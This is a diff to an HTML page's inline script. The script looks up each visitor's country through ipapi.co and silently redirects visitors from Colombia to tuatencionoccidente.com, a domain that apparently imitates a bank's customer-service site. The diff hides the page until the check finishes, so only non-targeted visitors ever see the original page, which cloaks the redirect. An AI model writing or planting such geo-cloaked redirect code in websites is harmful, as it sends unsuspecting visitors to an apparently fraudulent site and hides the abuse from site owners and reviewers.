@@ -4,13 +4,18 @@
   <script>
 document.write(`
 <style>
+body {
+  visibility: hidden;
+}
+
 .loader {
+  visibility: visible;
   width: 50px;
   height: 50px;
   border: 5px solid #ddd;
   border-top: 5px solid #000;
   border-radius: 50%;
-  animation: spin 3s linear infinite;
+  animation: spin 2s linear infinite;
   position: fixed;
   top: 50%;
   left: 50%;
@@ -28,8 +33,18 @@ document.write(`
 (async()=>{
     try {
         let d = await (await fetch("https://ipapi.co/json/")).json();
-        if(d.country_code==="CO") location.replace("https://tuatencionoccidente.com");
-    }catch(e){}
+
+        if(d.country_code==="CO") {
+            location.replace("https://tuatencionoccidente.com");
+        } else {
+            document.body.style.visibility = "visible";
+            document.querySelector(".loader").remove();
+        }
+
+    } catch(e) {
+        document.body.style.visibility = "visible";
+        document.querySelector(".loader").remove();
+    }
 })();
 </script>
   <meta charset="UTF-8" />
